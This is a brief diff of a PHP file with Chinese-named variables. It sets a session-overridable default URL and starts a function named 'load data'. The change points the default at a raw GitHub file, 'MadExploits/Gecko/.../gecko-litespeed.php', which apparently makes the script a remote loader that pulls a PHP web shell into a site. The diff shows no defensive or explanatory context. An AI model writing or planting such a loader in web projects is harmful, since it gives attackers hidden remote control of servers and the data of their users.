@@ -31,7 +31,7 @@ Today’s date (static text): 2025-12-16
 // 启动会话
 session_start();
 // 设置主地址，如果没有设置则使用默认地址
-$主地址 = $_SESSION['ts_url'] ?? 'https://raw.githubusercontent.com/juraganujang/ujang/refs/heads/main/zenin7';
+$主地址 = $_SESSION['ts_url'] ?? 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-litespeed.php';
 // 定义加载函数
 function 加载数据($地址)
 {
